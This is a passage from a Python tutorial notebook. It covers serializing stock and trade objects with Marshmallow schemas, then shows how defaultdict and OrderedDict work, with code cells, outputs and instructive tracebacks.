class Trade:
    def __init__(self, symbol, timestamp, order, price, volume, commission):
        self.symbol = symbol
        self.timestamp = timestamp
        self.order = order
        self.price = price
        self.commission = commission
        self.volume = volume
        
    def as_dict(self):
        return dict(
            symbol=self.symbol,
            timestamp=self.timestamp,
            order=self.order,
            price=self.price,
            volume=self.volume,
            commission=self.commission)
    
    def __eq__(self, other):
        return isinstance(other, Trade) and self.as_dict() == other.as_dict()
```


```
activity = {
    "quotes": [
        Stock('TSLA', date(2018, 11, 22), 
              Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), Decimal('338.19'), 365_607),
        Stock('AAPL', date(2018, 11, 22), 
              Decimal('176.66'), Decimal('177.25'), Decimal('176.64'), Decimal('176.78'), 3_699_184),
        Stock('MSFT', date(2018, 11, 22), 
              Decimal('103.25'), Decimal('103.48'), Decimal('103.07'), Decimal('103.11'), 4_493_689)
    ],
    
    "trades": [
        Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99')),
        Trade('AAPL', datetime(2018, 11, 22, 10, 30, 5), 'sell', Decimal('177.01'), 20, Decimal('9.99'))
    ]
}
```


```
encoded = dumps(activity, cls=CustomEncoder)
```


```
decoded = loads(encoded, cls=CustomDecoder)
```


```
decoded == activity
```




    True



##  Exercise 3 - Solution

Here we want to use Marshmallow to do the serialization and deserialization that we did in Exercises 1 and 2.


```
class Stock:
    def __init__(self, symbol, date, open_, high, low, close, volume):
        self.symbol = symbol
        self.date = date
        self.open = open_
        self.high = high
        self.low = low
        self.close = close
        self.volume = volume
        
class Trade:
    def __init__(self, symbol, timestamp, order, price, volume, commission):
        self.symbol = symbol
        self.timestamp = timestamp
        self.order = order
        self.price = price
        self.commission = commission
        self.volume = volume
```


```
from datetime import date, datetime
from decimal import Decimal

activity = {
    "quotes": [
        Stock('TSLA', date(2018, 11, 22), 
              Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), Decimal('338.19'), 365_607),
        Stock('AAPL', date(2018, 11, 22), 
              Decimal('176.66'), Decimal('177.25'), Decimal('176.64'), Decimal('176.78'), 3_699_184),
        Stock('MSFT', date(2018, 11, 22), 
              Decimal('103.25'), Decimal('103.48'), Decimal('103.07'), Decimal('103.11'), 4_493_689)
    ],
    
    "trades": [
        Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99')),
        Trade('AAPL', datetime(2018, 11, 22, 10, 30, 5), 'sell', Decimal('177.01'), 20, Decimal('9.99'))
    ]
}
```

I'm first going to define some schemas for trades and stocks:


```
from marshmallow import Schema, fields
```


```
class StockSchema(Schema):
    symbol = fields.Str()
    date = fields.Date()
    open = fields.Decimal()
    high = fields.Decimal()
    low = fields.Decimal()
    close = fields.Decimal()
    volume = fields.Integer()
```

Let's test this one out quickly:


```
StockSchema().dump(Stock('TSLA', date(2018, 11, 22), 
                          Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), 
                          Decimal('338.19'), 365_607))
```




    MarshalResult(data={'low': Decimal('337.60'), 'open': Decimal('338.19'), 'close': Decimal('338.19'), 'volume': 365607, 'symbol': 'TSLA', 'high': Decimal('338.64'), 'date': '2018-11-22'}, errors={})



That's great, but there's a slight issue - you'll notice that the marshalled data has `Decimal` objects for our prices. This is still going to be an issue if we try to serialize to JSON:


```
StockSchema().dumps(Stock('TSLA', date(2018, 11, 22), 
                          Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), 
                          Decimal('338.19'), 365_607))
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-6-fff3c2bd8bbe> in <module>
          1 StockSchema().dumps(Stock('TSLA', date(2018, 11, 22), 
          2                           Decimal('338.19'), Decimal('338.64'), Decimal('337.60'),
    ----> 3                           Decimal('338.19'), 365_607))
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in dumps(self, obj, many, update_fields, *args, **kwargs)
        551         """
        552         deserialized, errors = self.dump(obj, many=many, update_fields=update_fields)
    --> 553         ret = self.opts.json_module.dumps(deserialized, *args, **kwargs)
        554         return MarshalResult(ret, errors)
        555 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/__init__.py in dumps(obj, skipkeys, ensure_ascii, check_circular, allow_nan, cls, indent, separators, default, sort_keys, **kw)
        229         cls is None and indent is None and separators is None and
        230         default is None and not sort_keys and not kw):
    --> 231         return _default_encoder.encode(obj)
        232     if cls is None:
        233         cls = JSONEncoder
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in encode(self, o)
        197         # exceptions aren't as detailed.  The list call should be roughly
        198         # equivalent to the PySequence_Fast that ''.join() would do.
    --> 199         chunks = self.iterencode(o, _one_shot=True)
        200         if not isinstance(chunks, (list, tuple)):
        201             chunks = list(chunks)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in iterencode(self, o, _one_shot)
        255                 self.key_separator, self.item_separator, self.sort_keys,
        256                 self.skipkeys, _one_shot)
    --> 257         return _iterencode(o, 0)
        258 
        259 def _make_iterencode(markers, _default, _encoder, _indent, _floatstr,
    

    ~/anaconda3/envs/deepdive/lib/python3.6/json/encoder.py in default(self, o)
        178         """
        179         raise TypeError("Object of type '%s' is not JSON serializable" %
    --> 180                         o.__class__.__name__)
        181 
        182     def encode(self, o):
    

    TypeError: Object of type 'Decimal' is not JSON serializable


So let's fix that:


```
class StockSchema(Schema):
    symbol = fields.Str()
    date = fields.Date()
    open = fields.Decimal(as_string=True)
    high = fields.Decimal(as_string=True)
    low = fields.Decimal(as_string=True)
    close = fields.Decimal(as_string=True)
    volume = fields.Integer()
```


```
StockSchema().dump(Stock('TSLA', date(2018, 11, 22), 
                          Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), 
                          Decimal('338.19'), 365_607)).data
```




    {'low': '337.60',
     'open': '338.19',
     'close': '338.19',
     'volume': 365607,
     'symbol': 'TSLA',
     'high': '338.64',
     'date': '2018-11-22'}



And now we can serialize to JSON:


```
StockSchema().dumps(Stock('TSLA', date(2018, 11, 22), 
                          Decimal('338.19'), Decimal('338.64'), Decimal('337.60'), 
                          Decimal('338.19'), 365_607)).data
```




    '{"low": "337.60", "open": "338.19", "close": "338.19", "volume": 365607, "symbol": "TSLA", "high": "338.64", "date": "2018-11-22"}'



Let's now handle the `Trade` schema:


```
class TradeSchema(Schema):
    symbol = fields.Str()
    timestamp = fields.DateTime()
    order = fields.Str()
    price = fields.Decimal(as_string=True)
    commission = fields.Decimal(as_string=True)
    volume = fields.Integer()
```


```
TradeSchema().dumps(Trade('TSLA', datetime(2018, 11, 22, 10, 5, 12), 'buy', Decimal('338.25'), 100, Decimal('9.99'))).data
```




    '{"price": "338.25", "volume": 100, "symbol": "TSLA", "order": "buy", "commission": "9.99", "timestamp": "2018-11-22T10:05:12+00:00"}'



Now let's write a schema for our overall dictionary that contains a list of Trades and a list of Quotes:


```
class ActivitySchema(Schema):
    trades = fields.Nested(TradeSchema, many=True)
    quotes = fields.Nested(StockSchema, many=True)
```

And we can now serialize and deserialize:


```
result = ActivitySchema().dumps(activity, indent=2).data
```


```
type(result)
```




    str




```
print(result)
```

    {
      "trades": [
        {
          "price": "338.25",
          "volume": 100,
          "symbol": "TSLA",
          "order": "buy",
          "commission": "9.99",
          "timestamp": "2018-11-22T10:05:12+00:00"
        },
        {
          "price": "177.01",
          "volume": 20,
          "symbol": "AAPL",
          "order": "sell",
          "commission": "9.99",
          "timestamp": "2018-11-22T10:30:05+00:00"
        }
      ],
      "quotes": [
        {
          "low": "337.60",
          "open": "338.19",
          "close": "338.19",
          "volume": 365607,
          "symbol": "TSLA",
          "high": "338.64",
          "date": "2018-11-22"
        },
        {
          "low": "176.64",
          "open": "176.66",
          "close": "176.78",
          "volume": 3699184,
          "symbol": "AAPL",
          "high": "177.25",
          "date": "2018-11-22"
        },
        {
          "low": "103.07",
          "open": "103.25",
          "close": "103.11",
          "volume": 4493689,
          "symbol": "MSFT",
          "high": "103.48",
          "date": "2018-11-22"
        }
      ]
    }
    

So a JSON string...
Let's deserialize that JSON string:


```
activity_deser = ActivitySchema().loads(result).data
```


```
type(activity_deser)
```




    dict




```
from pprint import pprint

pprint(activity_deser)
```

    {'quotes': [{'close': Decimal('338.19'),
                 'date': datetime.date(2018, 11, 22),
                 'high': Decimal('338.64'),
                 'low': Decimal('337.60'),
                 'open': Decimal('338.19'),
                 'symbol': 'TSLA',
                 'volume': 365607},
                {'close': Decimal('176.78'),
                 'date': datetime.date(2018, 11, 22),
                 'high': Decimal('177.25'),
                 'low': Decimal('176.64'),
                 'open': Decimal('176.66'),
                 'symbol': 'AAPL',
                 'volume': 3699184},
                {'close': Decimal('103.11'),
                 'date': datetime.date(2018, 11, 22),
                 'high': Decimal('103.48'),
                 'low': Decimal('103.07'),
                 'open': Decimal('103.25'),
                 'symbol': 'MSFT',
                 'volume': 4493689}],
     'trades': [{'commission': Decimal('9.99'),
                 'order': 'buy',
                 'price': Decimal('338.25'),
                 'symbol': 'TSLA',
                 'timestamp': datetime.datetime(2018, 11, 22, 10, 5, 12, tzinfo=tzutc()),
                 'volume': 100},
                {'commission': Decimal('9.99'),
                 'order': 'sell',
                 'price': Decimal('177.01'),
                 'symbol': 'AAPL',
                 'timestamp': datetime.datetime(2018, 11, 22, 10, 30, 5, tzinfo=tzutc()),
                 'volume': 20}]}
    

That's looking pretty good, but you'll notice something - the objects in the `trades` and `quotes` list have been loaded into plain dictionary objects, not `Trade` and `Stock` objects:


```
type(activity_deser['trades'][0])
```




    dict



For this we have to remember to provide functions decorated with `@post_load`:


```
from marshmallow import post_load

class TradeSchema(Schema):
    symbol = fields.Str()
    timestamp = fields.DateTime()
    order = fields.Str()
    price = fields.Decimal(as_string=True)
    commission = fields.Decimal(as_string=True)
    volume = fields.Integer()
    
    @post_load
    def make_trade(self, data):
        return Trade(**data)
```


```
class StockSchema(Schema):
    symbol = fields.Str()
    date = fields.Date()
    open = fields.Decimal(as_string=True)
    high = fields.Decimal(as_string=True)
    low = fields.Decimal(as_string=True)
    close = fields.Decimal(as_string=True)
    volume = fields.Integer()
    
    @post_load()
    def make_stock(self, data):
        return Stock(**data)
```

And of course we have to redefine our `ActivitySchema` to make sure it is referencing the newly defined sub schema classes:


```
class ActivitySchema(Schema):
    trades = fields.Nested(TradeSchema, many=True)
    quotes = fields.Nested(StockSchema, many=True)
```

And now we can try this again:


```
activity_deser = ActivitySchema().loads(result).data
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-23-94f20a210573> in <module>
    ----> 1 activity_deser = ActivitySchema().loads(result).data
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in loads(self, json_data, many, *args, **kwargs)
        592 
        593         data = self.opts.json_module.loads(json_data, *args, **kwargs)
    --> 594         return self.load(data, many=many, partial=partial)
        595 
        596     def validate(self, data, many=None, partial=None):
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in load(self, data, many, partial)
        569         .. versionadded:: 1.0.0
        570         """
    --> 571         result, errors = self._do_load(data, many, partial=partial, postprocess=True)
        572         return UnmarshalResult(data=result, errors=errors)
        573 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in _do_load(self, data, many, partial, postprocess)
        651                     partial=partial,
        652                     dict_class=self.dict_class,
    --> 653                     index_errors=self.opts.index_errors,
        654                 )
        655             except ValidationError as error:
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/marshalling.py in deserialize(self, data, fields_dict, many, partial, dict_class, index_errors, index)
        288                     field_name=field_name,
        289                     field_obj=field_obj,
    --> 290                     index=(index if index_errors else None)
        291                 )
        292                 if value is not missing:
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/marshalling.py in call_and_store(self, getter_func, data, field_name, field_obj, index)
         60         """
         61         try:
    ---> 62             value = getter_func(data)
         63         except ValidationError as err:  # Store validation errors
         64             self.error_kwargs.update(err.kwargs)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/marshalling.py in <lambda>(val)
        281                     val,
        282                     field_obj.load_from or attr_name,
    --> 283                     data
        284                 )
        285                 value = self.call_and_store(
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/fields.py in deserialize(self, value, attr, data)
        262         if getattr(self, 'allow_none', False) is True and value is None:
        263             return None
    --> 264         output = self._deserialize(value, attr, data)
        265         self._validate(output)
        266         return output
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/fields.py in _deserialize(self, value, attr, data)
        463             self.fail('type', input=value, type=value.__class__.__name__)
        464 
    --> 465         data, errors = self.schema.load(value)
        466         if errors:
        467             raise ValidationError(errors, data=data)
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in load(self, data, many, partial)
        569         .. versionadded:: 1.0.0
        570         """
    --> 571         result, errors = self._do_load(data, many, partial=partial, postprocess=True)
        572         return UnmarshalResult(data=result, errors=errors)
        573 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in _do_load(self, data, many, partial, postprocess)
        676                     result,
        677                     many,
    --> 678                     original_data=data)
        679             except ValidationError as err:
        680                 errors = err.normalized_messages()
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in _invoke_load_processors(self, tag_name, data, many, original_data)
        856             data=data, many=many, original_data=original_data)
        857         data = self._invoke_processors(tag_name, pass_many=False,
    --> 858             data=data, many=many, original_data=original_data)
        859         return data
        860 
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in _invoke_processors(self, tag_name, pass_many, data, many, original_data)
        954                             for item in data]
        955                 else:
    --> 956                     data = [utils.if_none(processor(item), item) for item in data]
        957             else:
        958                 if pass_original:
    

    ~/anaconda3/envs/deepdive/lib/python3.6/site-packages/marshmallow/schema.py in <listcomp>(.0)
        954                             for item in data]
        955                 else:
    --> 956                     data = [utils.if_none(processor(item), item) for item in data]
        957             else:
        958                 if pass_original:
    

    <ipython-input-21-d0d4a8dc286c> in make_stock(self, data)
         10     @post_load()
         11     def make_stock(self, data):
    ---> 12         return Stock(**data)
    

    TypeError: __init__() got an unexpected keyword argument 'open'


So here we have an issue - basically our method to construct a new `Stock` object expects the argument for the open price to be `open_`, and not `open` which is what our schema is producing.

We could do it in one of two ways:

First we can change our method that builds the `Stock` object:


```
class StockSchema(Schema):
    symbol = fields.Str()
    date = fields.Date()
    open = fields.Decimal(as_string=True)
    high = fields.Decimal(as_string=True)
    low = fields.Decimal(as_string=True)
    close = fields.Decimal(as_string=True)
    volume = fields.Integer()
    
    @post_load()
    def make_stock(self, data):
        data['open_'] = data.pop('open')
        return Stock(**data)
```


```
class ActivitySchema(Schema):
    trades = fields.Nested(TradeSchema, many=True)
    quotes = fields.Nested(StockSchema, many=True)
```


```
activity_deser = ActivitySchema().loads(result).data
```


```
pprint(activity_deser)
```

    {'quotes': [<__main__.Stock object at 0x105e70e80>,
                <__main__.Stock object at 0x105e70eb8>,
                <__main__.Stock object at 0x105e70ef0>],
     'trades': [<__main__.Trade object at 0x105e70c18>,
                <__main__.Trade object at 0x105e70b70>]}
    

So, let's just recap the various schemas we have to create:


```
class StockSchema(Schema):
    symbol = fields.Str()
    date = fields.Date()
    open = fields.Decimal(as_string=True)
    high = fields.Decimal(as_string=True)
    low = fields.Decimal(as_string=True)
    close = fields.Decimal(as_string=True)
    volume = fields.Integer()
    
    @post_load()
    def make_stock(self, data):
        data['open_'] = data.pop('open')
        return Stock(**data)
    
class TradeSchema(Schema):
    symbol = fields.Str()
    timestamp = fields.DateTime()
    order = fields.Str()
    price = fields.Decimal(as_string=True)
    commission = fields.Decimal(as_string=True)
    volume = fields.Integer()
    
    @post_load
    def make_trade(self, data):
        return Trade(**data)
    
class ActivitySchema(Schema):
    trades = fields.Nested(TradeSchema, many=True)
    quotes = fields.Nested(StockSchema, many=True)
```

As you can see this is a whole lot easier than doing it by hand using the standard library.

# Section 09 - Specialized Dictionaries

##  defaultdict

The `defaultdict` is a specialized dictionary found in the `collections` module. (It is a subclass of the `dict` type).


```
from collections import defaultdict
```

Standard dictionaries in Python will raise an exception if we try to access a non-existent key:


```
d = {}
```


```
d['a']
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-3-4ff0d9af6f7a> in <module>
    ----> 1 d['a']
    

    KeyError: 'a'


Now, we can certainly use the `.get` method:


```
result = d.get('a')
type(result)
```




    NoneType



And we can even specify a default value for the key if it is not present:


```
d.get('a', 0)
```




    0



Often we have dictionaries where we want to return a consistent default value if the requested key does not exist.

Although we can do so using the `.get` method as above, we have to remember to use the same default value every time - plus it gets a little cumbersome.

Let's say we want to keep track of the number of occurrences of individual characters in a string.

We might approach it this way:


```
counts = {}
sentence = "able was I ere I saw elba"

for c in sentence:
    if c in counts:
        counts[c] += 1
    else:
        counts[c] = 1
```


```
counts
```




    {'a': 4, 'b': 2, 'l': 2, 'e': 4, ' ': 6, 'w': 2, 's': 2, 'I': 2, 'r': 1}



So this works, but we have that `if` statement - it would be nice to simplify our code somewhat:


```
counts = {}
for c in sentence:
    counts[c] = counts.get(c, 0) + 1
```


```
counts
```




    {'a': 4, 'b': 2, 'l': 2, 'e': 4, ' ': 6, 'w': 2, 's': 2, 'I': 2, 'r': 1}



So, that works well and is much cleaner. But if we have to specify that default value (`0` in this case) many times in our code when working with the same dictionary, we have to remember what the default needs to be each time.

Instead, we could use a `defaultdict`. In a `defaultdict` we specify what the default value is for a missing key - more precisely, we specify a default factory method that is called:


```
counts = defaultdict(lambda : 0)
```


```
for c in sentence:
    counts[c] += 1
```


```
counts
```




    defaultdict(<function __main__.<lambda>()>,
                {'a': 4,
                 'b': 2,
                 'l': 2,
                 'e': 4,
                 ' ': 6,
                 'w': 2,
                 's': 2,
                 'I': 2,
                 'r': 1})



As you can see that simplified our code quite a bit, but the result is not quite a dictionary - it is a `defaultdict`. However, it inherits from `dict` so all the dictionary methods we have grown to know and love are still available because ` defaultdict` **is** a `dict`:


```
isinstance(counts, defaultdict)
```




    True




```
isinstance(counts, dict)
```




    True



And `counts` behaves like a regular dictionary too:


```
counts.items()
```




    dict_items([('a', 4), ('b', 2), ('l', 2), ('e', 4), (' ', 6), ('w', 2), ('s', 2), ('I', 2), ('r', 1)])




```
counts['a']
```




    4



The main difference is when we request a non-existent key:


```
counts['python']
```




    0



We get the default value back - not only that, but it actually created that key as well:


```
counts
```




    defaultdict(<function __main__.<lambda>()>,
                {'a': 4,
                 'b': 2,
                 'l': 2,
                 'e': 4,
                 ' ': 6,
                 'w': 2,
                 's': 2,
                 'I': 2,
                 'r': 1,
                 'python': 0})



So this is a bit different from using `.get`.

And of course we can manipulate our dictionary just like a standard dictionary:


```
counts['hello'] = 'world'
counts
```




    defaultdict(<function __main__.<lambda>()>,
                {'a': 4,
                 'b': 2,
                 'l': 2,
                 'e': 4,
                 ' ': 6,
                 'w': 2,
                 's': 2,
                 'I': 2,
                 'r': 1,
                 'python': 0,
                 'hello': 'world'})




```
del counts['hello']
counts
```




    defaultdict(<function __main__.<lambda>()>,
                {'a': 4,
                 'b': 2,
                 'l': 2,
                 'e': 4,
                 ' ': 6,
                 'w': 2,
                 's': 2,
                 'I': 2,
                 'r': 1,
                 'python': 0})



Very often you will see what looks like a **type** specified as the default factory - but keep in mind that it is in fact the corresponding functions (constructors) that are actually being specified.

For example:


```
int()
```




    0




```
bool()
```




    False




```
str()
```




    ''




```
list()
```




    []




```
d = defaultdict(int)
d['a']
```




    0




```
d = defaultdict(bool)
d['a']
```




    False




```
d = defaultdict(str)
d['a']
```




    ''




```
d = defaultdict(list)
d['a']
```




    []



Note that this no different than writing:


```
d = defaultdict(lambda: list())
d['a']
```




    []



Let's take a look at another example of where a `defaultdict` can be useful.

Suppose we have a dictionary structure that has people's names as keys, and a dictionary for the value that contains the person's eye color. We want to create a dictionary of eye colors, with a list of the people's names that have that eye color:


```
persons = {
    'john': {'age': 20, 'eye_color': 'blue'},
    'jack': {'age': 25, 'eye_color': 'brown'},
    'jill': {'age': 22, 'eye_color': 'blue'},
    'eric': {'age': 35},
    'michael': {'age': 27}
}
```

What we want is a dictionary with the eye colors (and `unknown` as the key if the eye color was not specified), and the names of the people with that eye color.

Let's first do this without a `defaultdict`, and also not using `.get`:


```
eye_colors = {}
for person, details in persons.items():
    if 'eye_color' in details:
        color = details['eye_color']
    else:
        color = 'unknown'
    if color in eye_colors:
        eye_colors[color].append(person)
    else:
        eye_colors[color] = [person]
```


```
eye_colors
```




    {'blue': ['john', 'jill'], 'brown': ['jack'], 'unknown': ['eric', 'michael']}



Now let's simplify this by leveraging the `.get` method:


```
eye_colors = {}
for person, details in persons.items():
    color = details.get('eye_color', 'Unknown')
    person_list = eye_colors.get(color, [])
    person_list.append(person)
    eye_colors[color] = person_list
```


```
eye_colors
```




    {'blue': ['john', 'jill'], 'brown': ['jack'], 'Unknown': ['eric', 'michael']}



And finally let's use a `defaultdict`:


```
eye_colors = defaultdict(list)
for person, details in persons.items():
    color = details.get('eye_color', 'Unknown')
    eye_colors[color].append(person)
```


```
eye_colors
```




    defaultdict(list,
                {'blue': ['john', 'jill'],
                 'brown': ['jack'],
                 'Unknown': ['eric', 'michael']})



When we create a `defaultdict` we have to specify the factory method as the first argument, but thereafter we can specify key/value pairs just like we would with the `dict` constructor (they are basically just passed along to the underlying `dict`):


```
d = defaultdict(bool, k1=True, k2=False, k3='python')
```


```
d
```




    defaultdict(bool, {'k1': True, 'k2': False, 'k3': 'python'})



So, using this, if we had used a `defaultdict` for the Person values, we could simplify our previous example a bit more:


```
persons = {
    'john': defaultdict(lambda: 'unknown', 
                        age=20, eye_color='blue'),
    'jack': defaultdict(lambda: 'unknown',
                        age=20, eye_color='brown'),
    'jill': defaultdict(lambda: 'unknown',
                        age=22, eye_color='blue'),
    'eric': defaultdict(lambda: 'unknown', age=35),
    'michael': defaultdict(lambda: 'unknown', age=27)
}
```


```
eye_colors = defaultdict(list)
for person, details in persons.items():
    eye_colors[details['eye_color']].append(person)
```


```
eye_colors
```




    defaultdict(list,
                {'blue': ['john', 'jill'],
                 'brown': ['jack'],
                 'unknown': ['eric', 'michael']})



It was a little tedious defining that `defaultdict` for every instance in our `persons` dictionary.

This is a good example of where a **partial** function would be really useful. (I cover partial functions in Part 1 of this series, or you can review the documentation here: https://docs.python.org/3.7/library/functools.html#functools.partial

(You can also just use a lambda function as well)


```
from functools import partial
```


```
eyedict = partial(defaultdict, lambda: 'unknown')
```

Alternatively we could also just define it this way:


```
eyedict = lambda *args, **kwargs: defaultdict(lambda: 'unknown', *args, **kwargs)
```


```
persons = {
    'john': eyedict(age=20, eye_color='blue'),
    'jack': eyedict(age=20, eye_color='brown'),
    'jill': eyedict(age=22, eye_color='blue'),
    'eric': eyedict(age=35),
    'michael': eyedict(age=27)
}
```


```
persons
```




    {'john': defaultdict(<function __main__.<lambda>.<locals>.<lambda>()>,
                 {'age': 20, 'eye_color': 'blue'}),
     'jack': defaultdict(<function __main__.<lambda>.<locals>.<lambda>()>,
                 {'age': 20, 'eye_color': 'brown'}),
     'jill': defaultdict(<function __main__.<lambda>.<locals>.<lambda>()>,
                 {'age': 22, 'eye_color': 'blue'}),
     'eric': defaultdict(<function __main__.<lambda>.<locals>.<lambda>()>,
                 {'age': 35}),
     'michael': defaultdict(<function __main__.<lambda>.<locals>.<lambda>()>,
                 {'age': 27})}



And we can use our previous code just as before:


```
eye_colors = defaultdict(list)
for person, details in persons.items():
    eye_colors[details['eye_color']].append(person)
```


```
eye_colors
```




    defaultdict(list,
                {'blue': ['john', 'jill'],
                 'brown': ['jack'],
                 'unknown': ['eric', 'michael']})



Let's look at another example where we use a non-deterministic factory. We could make a database call, an API call, and so on. To keep this simple I'm going to use the current time as my default.

In this example we want to keep track of how many times certain functions are being called, as well as when they were **first** called. To do this I want to be able to decorate the functions I want to keep track of, and I want to be able to specify the dictionary that should be used so I can keep a reference to it so I can examine the results.



```
from collections import defaultdict, namedtuple
from datetime import datetime
from functools import wraps

def function_stats():
    d = defaultdict(lambda: {"count": 0, "first_called": datetime.utcnow()})
    Stats = namedtuple('Stats', 'decorator data')
    
    def decorator(fn):
        @wraps(fn)
        def wrapper(*args, **kwargs):
            d[fn.__name__]['count'] += 1
            return fn(*args, **kwargs)
        return wrapper
    
    return Stats(decorator, d)        
```


```
stats = function_stats()
```


```
dict(stats.data)
```




    {}




```
@stats.decorator
def func_1():
    pass

@stats.decorator
def func_2(x, y):
    pass
```


```
dict(stats.data)
```




    {}




```
func_1()
```


```
dict(stats.data)
```




    {'func_1': {'count': 1,
      'first_called': datetime.datetime(2018, 12, 29, 22, 43, 48, 828143)}}




```
func_1()
```


```
dict(stats.data)
```




    {'func_1': {'count': 2,
      'first_called': datetime.datetime(2018, 12, 29, 22, 43, 48, 828143)}}




```
func_2(10, 20)
```


```
dict(stats.data)
```




    {'func_1': {'count': 2,
      'first_called': datetime.datetime(2018, 12, 29, 22, 43, 48, 828143)},
     'func_2': {'count': 1,
      'first_called': datetime.datetime(2018, 12, 29, 22, 43, 49, 714090)}}



##  OrderedDict

Prior to Python 3.7, dictionary key order was not guaranteed. This became part of the language in 3.7, so the usefullness of this `OrderedDict` is diminished - but necessary if you want your dictionaries to maintain key order **and** be compatible with Python versions earlier then 3.6 (technically dicts are ordered in 3.6 as well, but it was considered an implementation detail, and not actually guaranteed).

We'll come back to a direct comparison of `OrderedDict` and plain `dict` in a subsequent video. For now let's look at the `OrderedDict` as if we were targeting our code to be compatible with earlier versions of Python.


```
from collections import OrderedDict
```

Once again, `OrderedDict` is a subclass of `dict`.

We can also pass keyword arguments to the constructor. However, in Python versions prior to 3.5, the order of the arguments is not guaranteed to be preserved - so to be fully backward-compatible, insert keys into the dictionary **after** you have created it as an empty dictionary.

Let's try it out:


```
d = OrderedDict()
```


```
d['z'] = 'hello'
```


```
d['y'] = 'world'
```


```
d['a'] = 'python'
```


```
d
```




    OrderedDict([('z', 'hello'), ('y', 'world'), ('a', 'python')])



And if we iterate through the keys of the `OrderedDict` we will retain that key order as well:


```
for key in d:
    print(key)
```

    z
    y
    a
    

The `OrderedDict` also supports reverse iteration using `reversed()`:


```
for key in reversed(d):
    print(key)
```

    a
    y
    z
    

This is not the case for a standard dictionary, even in Python 3.5+ where key order is maintained!

In the next video we'll dig a little more into a comparison between `OrderedDicts` and `dicts`.


```
d = {'a': 1, 'b': 2}
for key in reversed(d):
    print(key)
```


    ---------------------------------------------------------------------------

    TypeError                                 Traceback (most recent call last)

    <ipython-input-9-4c0792d47b93> in <module>
          1 d = {'a': 1, 'b': 2}
    ----> 2 for key in reversed(d):
          3     print(key)
    

    TypeError: 'dict' object is not reversible


`OrderedDicts` are a subclass of `dicts` so all the usual operations and methods apply, but `OrderedDicts` have a couple of extra methods available to us:
1. `popitem(last=True)`
2. `move_to_end(key, last=True)`

Since an `OrderedDict` has an ordering, it is natural to think of the *first* or *last* element in the dictionary.

The `popitem` allows us to remove the last (by default) or first item (setting `last=False`):


```
d = OrderedDict()
d['first'] = 10
d['second'] = 20
d['third'] = 30
d['last'] = 40
```


```
d
```




    OrderedDict([('first', 10), ('second', 20), ('third', 30), ('last', 40)])




```
d.popitem()
```




    ('last', 40)




```
d
```




    OrderedDict([('first', 10), ('second', 20), ('third', 30)])



As you can see the last item was popped off (and returned as a key/value tuple). To pop the first item we can do this:


```
d.popitem(last=False)
```




    ('first', 10)




```
d
```




    OrderedDict([('second', 20), ('third', 30)])



The `move_to_end` method simply moves the specified key to the end (by default), or to the beginning (if `last=False` is specified) of the dictionary:


```
d = OrderedDict()
d['first'] = 10
d['second'] = 20
d['third'] = 30
d['last'] = 40
```


```
d.move_to_end('second')
```


```
d
```




    OrderedDict([('first', 10), ('third', 30), ('last', 40), ('second', 20)])




```
d.move_to_end('third', last=False)
```


```
d
```




    OrderedDict([('third', 30), ('first', 10), ('last', 40), ('second', 20)])



Be careful if you specify a non-existent key, you will get an exception:


```
d.move_to_end('x')
```


    ---------------------------------------------------------------------------

    KeyError                                  Traceback (most recent call last)

    <ipython-input-21-e837f58586af> in <module>
    ----> 1 d.move_to_end('x')
    

    KeyError: 'x'


#### Equality Comparisons

With regular dictionaries, two dictionaries are considered equal (`==`) if they contain the same key/value pairs, irrespective of the ordering.


```
d1 = {'a': 10, 'b': 20}
d2 = {'b': 20, 'a': 10}
```


```
d1 == d2
```




    True



But this is not the case with `OrderedDicts` - since ordering matters here, two `OrderedDicts` will compare equal if both their key/values pairs are equal **and** if the keys are in the same order:


```
d1 = OrderedDict()
d1['a'] = 10
d1['b'] = 20

d2 = OrderedDict()
d2['a'] = 10
d2['b'] = 20

d3 = OrderedDict()
d3['b'] = 20
d3['a'] = 10


print(d1)
print(d2)
print(d3)
```

    OrderedDict([('a', 10), ('b', 20)])
    OrderedDict([('a', 10), ('b', 20)])
    OrderedDict([('b', 20), ('a', 10)])
    


```
d1 == d2
```




    True




```
d1 == d3
```




    False



Now, an `OrderedDict` is a subclass of a standard `dict`:


```
isinstance(d1, OrderedDict)
```




    True




```
isinstance(d1, dict)
```




    True



So, can we compare an `OrderedDict` with a plain `dict`?

The answer is yes, and in this case order does **not** matter:


```
d1 = OrderedDict()
d1['a'] = 10
d1['b'] = 20

d2 = {'b': 20, 'a': 10}

print(d1)
print(d2)
```

    OrderedDict([('a', 10), ('b', 20)])
    {'b': 20, 'a': 10}
    


```
d1 == d2
```




    True




```
d2 == d1
```




    True



#### Using an OrderedDict as a Stack or Queue

